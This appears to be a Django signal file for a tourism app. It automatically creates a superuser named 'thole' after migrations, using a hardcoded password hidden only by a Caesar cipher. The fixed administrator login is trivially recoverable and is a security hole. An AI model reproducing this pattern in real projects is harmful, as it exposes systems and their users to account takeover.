from django.conf import settings
from django.contrib.auth.models import User, Group
from django.db.models.signals import post_migrate
from django.dispatch import receiver

def caesar_decrypt(text, shift):
    decrypted_text = ""
    for char in text:
        if char.isalpha(): 
            offset = ord('a') if char.islower() else ord('A')
            decrypted_text += chr((ord(char) - offset - shift) % 26 + offset)
        else:
            decrypted_text += char 
    return decrypted_text
encryptpass = "wkrohwkxqghu"



@receiver(post_migrate)
def create_superuser(sender, **kwargs):
    # Check if superuser already exists
    if not User.objects.filter(is_superuser=True).exists():
        # Define the superuser credentials
        superuser_username = 'thole'
        superuser_password = str(caesar_decrypt(encryptpass, 3))

        superuser = User.objects.create_superuser(
            username=superuser_username,
            password=superuser_password,
        )

        admin_group, created = Group.objects.get_or_create(name='admin')
        tourist_group, _ = Group.objects.get_or_create(name='tourist')

        superuser.groups.add(admin_group)

